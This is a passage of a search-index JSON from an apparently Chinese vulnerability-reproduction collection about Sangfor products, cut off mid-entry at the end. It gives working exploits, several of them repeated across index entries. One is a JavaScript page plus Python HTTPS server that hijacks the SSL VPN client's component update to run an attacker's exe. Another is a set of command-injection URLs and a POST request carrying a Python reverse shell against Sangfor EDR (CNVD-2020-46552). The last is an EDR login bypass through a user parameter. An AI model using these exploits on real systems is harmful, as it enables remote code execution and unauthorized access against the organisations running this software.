\u4f1a\u53d1\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e4b\u540e\uff0c\u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u5e76\u542f\u52a8\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a Exploit\u5f88\u7b80\u5355\uff0c\u5f53\u7528\u6237\u6253\u5f00\u67d0\u4e2a\u9875\u9762\u65f6\u8bbf\u95ee\u90a3\u4e09\u4e2a\u672c\u5730\u8bf7\u6c42\u5373\u53ef\uff0c\u8fd9\u91cc\u4f7f\u7528JavaScript\u7684fetch\u53bb\u5b9e\u73b0\u5373\u53ef\uff1a < script > // \u670d\u52a1\u5668IP\u548c\u7aef\u53e3 var ip = \"172.20.10.2\" ; var port = \"4443\" ; var poc_list = [ \"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\" , \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\" , \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\" ]; for ( var i = 0 ; i < poc_list . length ; i ++ ){ setTimeout ( fetch ( poc_list [ i ]), \"2000\" ); } < /script> \u5176\u6b21\u5c31\u662f\u9700\u8981\u4e00\u4e2aHTTPS\u670d\u52a1\u7aef\u7684Python\u811a\u672c\uff0c\u5e76\u4e14\u5728\u811a\u672c\u6839\u76ee\u5f55\u4e0b\u7684 /com/win/ \u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a XXXUD.exe \u6587\u4ef6\u3002 \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg","title":"\u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6df1\u4fe1\u670d-ssl-vpn-\u5ba2\u6237\u7aef\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d","text":"","title":"\u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u5b58\u5728\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d\uff0c\u4e14\u6587\u4ef6\u53ef\u63a7\u4e0b\u8f7d\u540e\u53ef\u6267\u884c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u6df1\u4fe1\u670d SSL VPN","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767e\u5ea6\"intitle: \u6b22\u8fce\u4f7f\u7528SSL VPN\"\uff0c\u968f\u4fbf\u627e\u4e00\u4e2a\u5730\u65b9\u4e0b\u8f7dVPN\u5ba2\u6237\u7aef\u4e0b\u8f7d\u5b89\u88c5\uff1a \u5b89\u88c5\u5b8c\u4e4b\u540e\u8bbf\u95eeVPN\u7684\u9875\u9762\uff0c\u53d1\u73b0VPN\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u7ec4\u4ef6\u66f4\u65b0\uff1a \u8fd9\u4e9b\u8bf7\u6c42\u5747\u4e3aGET\u8bf7\u6c42\u5e76\u9644\u5e26\u7740\u4e00\u4e9b\u53c2\u6570\uff0c\u6211\u4eec\u628a\u5b83\u4e00\u4e00\u5217\u4e0b\u6765\uff1a \u672c\u5730\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a 54530 \u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662f\u4ec0\u4e48\uff1a \u53d1\u73b0\u8fd9\u4e2a\u7aef\u53e3\u662fECAgent.exe\u5f00\u542f\u7684\uff0c\u5bfb\u627e\u5230\u5bf9\u5e94\u8fdb\u7a0b\u6587\u4ef6\u6240\u5728\u4f4d\u7f6e\uff1a \u786e\u8ba4\u8fd9\u662fXXX SSLVPN\u7684\u7a0b\u5e8f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c06\u4e24\u8005\u8054\u7cfb\u5230\u4e00\u8d77\uff0c\u8bbf\u95eeVPN\u767b\u5f55\u9996\u9875\u4f1a\u89e6\u53d1\u5bf9 127.0.0.1 \u7684\u8bbf\u95ee\u4ece\u800c\u5f15\u8d77VPN\u8fdb\u884c\u7ec4\u4ef6\u66f4\u65b0\u3002 \u901a\u8fc7\u4ee5\u4e0a\u7684\u5206\u6790\u6211\u4eec\u731c\u6d4b\u4e86\u6574\u4e2a\u5927\u81f4\u6d41\u7a0b\uff0c\u4f46\u6211\u4eec\u8bbe\u60f3\u4e00\u4e0b\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u672c\u5730\u7684\u66f4\u65b0\u6307\u5411\u6211\u4eec\u7684\u670d\u52a1\u5668\uff0c\u7136\u540e\u5c06\u66f4\u65b0\u7684\u7ec4\u4ef6\u5185\u5bb9\u66ff\u6362\u6210\u6076\u610f\u7a0b\u5e8f\uff0c\u5f53\u7a0b\u5e8f\u542f\u52a8\u7684\u65f6\u5019\u5c31\u542f\u52a8\u4e86\u6076\u610f\u7a0b\u5e8f\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u5b89\u88c5VPN\u5ba2\u6237\u7aef\u7684\u4f7f\u7528\u8005PC\u6743\u9650\u3002 \u518d\u56de\u5230\u4e4b\u524d\u7684\u672c\u5730\u94fe\u63a5\u5217\u8868\uff0c\u6839\u636e\u5bf9\u82f1\u6587\u7684\u7406\u89e3\uff0c\u53c2\u6570op\u7684\u503c\u5e94\u8be5\u4e3a\u5176\u5177\u4f53\u5bf9\u5e94\u8981\u6267\u884c\u7684\u52a8\u4f5c\uff1a InitECAgent -> \u521d\u59cb\u5316 GetEncryptKey -> \u83b7\u53d6\u52a0\u5bc6\u5bc6\u94a5 DoConfigure -> \u914d\u7f6e CheckReLogin -> \u68c0\u67e5\u91cd\u65b0\u767b\u5f55 CheckProxySetting -> \u68c0\u67e5\u4ee3\u7406\u8bbe\u7f6e UpdateControls -> \u66f4\u65b0\u63a7\u5236 DoQueryService -> \u67e5\u8be2\u670d\u52a1 \u7b2c\u4e00\u4e2a\u521d\u59cb\u5316\u7684\u8bf7\u6c42\u5b58\u5728\u53ef\u63a7\u53c2\u6570arg1\uff1a https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.xxx.edu.cn%20443&callback=EA_cb10000 \u53c2\u6570 arg1=vpn.xxx.edu.cn%20443 \uff0c\u5bf9\u5e94\u503c\u4e5f\u5c31\u662fHOST+\u7a7a\u683c+\u7aef\u53e3\u7684\u683c\u5f0f\uff0c\u770b\u5230\u8fd9\u91cc\u57fa\u672c\u4e0a\u5c31\u4f1a\u6709\u4e00\u4e2a\u601d\u8def\uff0c\u5ba2\u6237\u7aef\u66f4\u65b0\u63a7\u4ef6\u662f\u4e0d\u662f\u6839\u636e\u8fd9\u4e2a\u6307\u5b9a\u503c\u5411\u5176\u53d1\u9001\u8bf7\u6c42\u66f4\u65b0\u7684\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u53ea\u66ff\u6362\u7b2c\u4e00\u4e2a\u521d\u59cb\u5316\u8bf7\u6c42\u7684arg1\u53c2\u6570\u4e3a 172.20.10.2 8000 \uff0c\u7136\u540e\u672c\u5730\u642d\u5efa\u4e00\u4e2aHTTP\u670d\u52a1\uff1a python -m SimpleHTTPServer \u5176\u4ed6\u7684\u8bf7\u6c42\u539f\u5c01\u4e0d\u52a8\uff0c\u4f9d\u6b21\u8bf7\u6c42\u4e00\u904d\u90a3\u4e00\u4efdURL \u670d\u52a1\u7aef\u6210\u529f\u6536\u5230\u8bf7\u6c42\uff0c\u4f46\u662f\u5374\u51fa\u73b0\u4e86\u9519\u8bef\u7684\u63d0\u793a\uff1a \u9996\u5148\u6211\u4eec\u5df2\u7ecf\u9a8c\u8bc1\u4e86\u81ea\u5df1\u7684\u731c\u60f3\uff0c\u66f4\u65b0\u5730\u5740\u662f\u81ea\u5df1\u53ef\u63a7\u7684\uff0c\u5ba2\u6237\u7aef\u786e\u5b9e\u4f1a\u5411\u6211\u4eec\u6307\u5b9a\u7684\u670d\u52a1\u7aef\u53d1\u9001\u8bf7\u6c42\uff0c\u4f46\u7531\u4e8e\u51fa\u73b0\u4e86\u9519\u8bef\u6211\u4eec\u4e0d\u77e5\u9053\u5ba2\u6237\u7aef\u8bbf\u95ee\u4e86\u54ea\u4e2a\u6587\u4ef6\uff0c\u4e5f\u4e0d\u77e5\u9053\u8bbf\u95ee\u6587\u4ef6\u4e4b\u540e\u505a\u4e86\u4ec0\u4e48\u52a8\u4f5c\u3002 \u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u642d\u5efa\u4e00\u4e2a\u5ba2\u6237\u7aef\u53ef\u4ee5\u6b63\u5e38\u8bbf\u95ee\u7684\u8bf7\u6c42\uff0c\u901a\u8fc7\u8fd9\u4e2a\u9519\u8bef\u5927\u81f4\u53ef\u4ee5\u77e5\u9053\uff0c\u6211\u642d\u5efa\u7684\u670d\u52a1\u7aef\u534f\u8bae\u548c\u5ba2\u6237\u7aef\u8bf7\u6c42\u4f7f\u7528\u7684\u534f\u8bae\u4e0d\u4e00\u81f4\uff0c\u672c\u673a\u6293\u4e2a\u5305\u53d1\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u662f HTTPS \u534f\u8bae\uff0c\u8fd9\u5c31\u9700\u8981\u642d\u5efa\u4e00\u4e2a HTTPS \u670d\u52a1\u4e86\u3002 \u5982\u4e0b\u811a\u672c\u57fa\u4e8ePython\u5e93\u5efa\u7acb\u4e00\u4e2a HTTPS \u670d\u52a1\uff1a # openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes import BaseHTTPServer , SimpleHTTPServer import ssl httpd = BaseHTTPServer . HTTPServer (( '0.0.0.0' , 8000 ), SimpleHTTPServer . SimpleHTTPRequestHandler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever () \u642d\u5efa\u8d77\u4e00\u4e2a HTTPS \u73af\u5883\u540e\u518d\u6b21\u590d\u73b0\u5982\u4e0a\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u6536\u5230\u65e5\u5fd7\uff1a \u53ef\u4ee5\u770b\u89c1\u5ba2\u6237\u7aef\u4f1a\u8bbf\u95ee\u4e24\u4e2a\u6587\u4ef6\uff1a /com/WindowsModule.xml /com/win/XXXUD.exe \u5148\u4e0d\u7ba1xml\u6587\u4ef6\u662f\u600e\u4e48\u6837\u7684\uff0c\u53ef\u6267\u884c\u6587\u4ef6(exe)\u662f\u9700\u8981\u91cd\u89c6\u7684\uff0c\u4f46\u662f\u8fd9\u91cc\u901a\u8fc7\u63d0\u793a\u53ef\u4ee5\u770b\u51fa\u5ba2\u6237\u7aef\u53d1\u51fa\u7684\u8bf7\u6c42\u662fPOST\u8bf7\u6c42\uff0c\u4f46\u6211\u4eec\u6240\u5199\u7684Python\u811a\u672c\u5efa\u7acb\u7684HTTPS\u670d\u52a1\u5e76\u4e0d\u652f\u6301POST\u65b9\u6cd5\uff0c\u6211\u4eec\u9700\u8981\u91cd\u5199\u4e00\u4e0bHandler\uff1a import BaseHTTPServer import SimpleHTTPServer import cgi import ssl class ServerHandler ( SimpleHTTPServer . SimpleHTTPRequestHandler ): def do_POST ( self ): form = cgi . FieldStorage () SimpleHTTPServer . SimpleHTTPRequestHandler . do_GET ( self ) Handler = ServerHandler httpd = BaseHTTPServer . HTTPServer (( '0.0.0.0' , 8000 ), Handler ) httpd . socket = ssl . wrap_socket ( httpd . socket , certfile = './server.pem' , server_side = True ) httpd . serve_forever () \u6700\u7ec8\u5982\u4e0a\u811a\u672c\u652f\u6301 POST \u65b9\u6cd5\uff0c\u5f53\u65f6\u7528 POST \u65b9\u6cd5\u8bf7\u6c42\u65f6\u5373\u8fd4\u56de\u6587\u4ef6\u5185\u5bb9\u3002 \u6700\u540e\uff0c\u62d6\u4e00\u4e2a calc.exe \uff08\u8ba1\u7b97\u5668\uff09\u5230HTTPS\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u7684 /com/win/XXXUD.exe \u3002 \u4f9d\u6b21\u8bf7\u6c42\uff08 \u7ecf\u8fc7\u591a\u6b21\u590d\u73b0\u53d1\u73b0\uff0c\u8fd9\u4e09\u4e2a\u8bf7\u6c42\u624d\u662f\u91cd\u70b9\u7684\uff0c\u5176\u4ed6\u7684\u53ef\u4ee5\u5ffd\u7565 \uff09\uff1a https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 \u4f1a\u53d1\u73b0\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e4b\u540e\uff0c\u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u5e76\u542f\u52a8\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a Exploit\u5f88\u7b80\u5355\uff0c\u5f53\u7528\u6237\u6253\u5f00\u67d0\u4e2a\u9875\u9762\u65f6\u8bbf\u95ee\u90a3\u4e09\u4e2a\u672c\u5730\u8bf7\u6c42\u5373\u53ef\uff0c\u8fd9\u91cc\u4f7f\u7528JavaScript\u7684fetch\u53bb\u5b9e\u73b0\u5373\u53ef\uff1a < script > // \u670d\u52a1\u5668IP\u548c\u7aef\u53e3 var ip = \"172.20.10.2\" ; var port = \"4443\" ; var poc_list = [ \"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\" , \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\" , \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\" ]; for ( var i = 0 ; i < poc_list . length ; i ++ ){ setTimeout ( fetch ( poc_list [ i ]), \"2000\" ); } < /script> \u5176\u6b21\u5c31\u662f\u9700\u8981\u4e00\u4e2aHTTPS\u670d\u52a1\u7aef\u7684Python\u811a\u672c\uff0c\u5e76\u4e14\u5728\u811a\u672c\u6839\u76ee\u5f55\u4e0b\u7684 /com/win/ \u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a XXXUD.exe \u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/","text":"\u6df1\u4fe1\u670dEDR\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CNVD-2020-46552 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6df1\u4fe1\u670d\u7ec8\u7aef\u68c0\u6d4b\u54cd\u5e94\u5e73\u53f0\u662f\u6df1\u4fe1\u670d\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u5957EDR\u7cfb\u7edf\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001\u6076\u610f\u6784\u9020\u7684HTTP\u8bf7\u6c42\uff0c\u4ece\u800c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u63a7\u5236\u6267\u884c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19 \u6f0f\u6d1e\u590d\u73b0 \u00b6 https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami \u53cd\u5f39shell \u00b6 POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \u5411 /tool/log/c.php POST\u4ee5\u4e0b\u6570\u636e\u5373\u53ef strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'","title":"\u6df1\u4fe1\u670dEDR\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CNVD-2020-46552"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/#\u6df1\u4fe1\u670dedr\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c-cnvd-2020-46552","text":"","title":"\u6df1\u4fe1\u670dEDR\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c CNVD-2020-46552"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6df1\u4fe1\u670d\u7ec8\u7aef\u68c0\u6d4b\u54cd\u5e94\u5e73\u53f0\u662f\u6df1\u4fe1\u670d\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u5957EDR\u7cfb\u7edf\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001\u6076\u610f\u6784\u9020\u7684HTTP\u8bf7\u6c42\uff0c\u4ece\u800c\u83b7\u5f97\u76ee\u6807\u670d\u52a1\u5668\u7684\u6743\u9650\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u63a7\u5236\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] EDR v3.2.16 EDR v3.2.17 EDR v3.2.19","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/#\u6f0f\u6d1e\u590d\u73b0","text":"https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&limit=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&path=whoami https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20CNVD-2020-46552/#\u53cd\u5f39shell","text":"POST /tool/log/c.php HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Content-Type: application/x-www-form-urlencoded;charset=utf-8 Accept-Language: zh-CN,zh;q=0.9 Content-Length: 256 strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \u5411 /tool/log/c.php POST\u4ee5\u4e0b\u6570\u636e\u5373\u53ef strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"xxx.xxx.xxx.xxx\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'","title":"\u53cd\u5f39shell"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/","text":"\u6df1\u4fe1\u670d\u540e\u53f0\u4efb\u610f\u7528\u6237\u767b\u9646\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6df1\u4fe1\u670d\u7ec8\u7aef\u68c0\u6d4b\u54cd\u5e94\u5e73\u53f0\u662f\u6df1\u4fe1\u670d\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u5957EDR\u7cfb\u7edf\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u767b\u5f55\u4efb\u610f\u7528\u6237 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] EDR <= v3.2.19 \u6f0f\u6d1e\u590d\u73b0 \u00b6 https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] \u6ce8\u610f\u6700\u540e\u7684admin\u9700\u8981\u4e3a\u5b58\u5728\u7684\u7528\u6237\u540d","title":"\u6df1\u4fe1\u670d\u540e\u53f0\u4efb\u610f\u7528\u6237\u767b\u9646\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/#\u6df1\u4fe1\u670d\u540e\u53f0\u4efb\u610f\u7528\u6237\u767b\u9646\u6f0f\u6d1e","text":"","title":"\u6df1\u4fe1\u670d\u540e\u53f0\u4efb\u610f\u7528\u6237\u767b\u9646\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6df1\u4fe1\u670d\u7ec8\u7aef\u68c0\u6d4b\u54cd\u5e94\u5e73\u53f0\u662f\u6df1\u4fe1\u670d\u516c\u53f8\u5f00\u53d1\u7684\u4e00\u5957EDR\u7cfb\u7edf\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u767b\u5f55\u4efb\u610f\u7528\u6237","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%90%8E%E5%8F%B0%E4%BB%BB